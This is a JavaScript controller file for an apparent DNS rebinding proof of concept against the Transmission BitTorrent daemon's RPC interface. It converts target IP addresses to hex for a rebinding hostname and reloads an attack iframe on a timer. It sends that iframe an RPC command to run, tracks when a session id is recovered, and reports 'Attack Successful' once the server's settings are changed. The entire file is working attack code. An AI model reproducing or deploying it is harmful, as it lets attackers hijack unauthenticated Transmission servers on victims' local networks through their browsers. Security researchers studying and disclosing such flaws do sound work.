var timer;
var count = 0;

function convert_dotted_quad(addr) {
	return addr.split('.')
			.map(function (a) { return Number(a).toString(16) })
			.map(function (a) { return a.length < 2 ? "0" + a : a })
			.join('');
}

window.addEventListener("message", function (msg) {
	console.log("message received from", msg.origin, msg.data.status);

	if (msg.data.status == "start") {
		console.log("iframe reports that attack has started");
		if (msg.origin == document.getElementById("attack").src.substr(0, msg.origin.length))
			clearInterval(timer);
		msg.source.postMessage({cmd: "interval", param: document.getElementById("interval").value}, "*");
		msg.source.postMessage({cmd: "command", param: document.getElementById("rpc").value}, "*");
		msg.source.postMessage({cmd: "start", param: null}, "*");
	}
	if (msg.data.status == "session") {
		console.log("iframe reports that session id has been recovered:", msg.data.sessionid);
	}
	if (msg.data.status == "pwned") {
		console.log("iframe reports that settings have been changed", msg.data.response);
		attack.contentWindow.postMessage({cmd: "stop"}, "*");
		clearInterval(timer);
		alert("Attack Successful: " + msg.data.response);
	}
	if (msg.data.status == "auth") {
		console.log("iframe reports that the tramission server requires auth");
		attack.contentWindow.postMessage({cmd: "stop"}, "*");
		clearInterval(timer);
		alert("Transmission Server Requires Authentication - Not Vulnerable");
	}
});

function reloadFrame() {
	document.getElementById("attack").src = document.getElementById("hosturl").value
			.replace("%1", convert_dotted_quad(document.getElementById("hostA").value))
			.replace("%2", convert_dotted_quad(document.getElementById("hostB").value))
			+ "?rnd=" + Math.random();
}

function begin() {
	start.disabled = true;
	timer = setInterval(reloadFrame, parseInt(document.getElementById("interval").value) * 1000);
	reloadFrame();
}
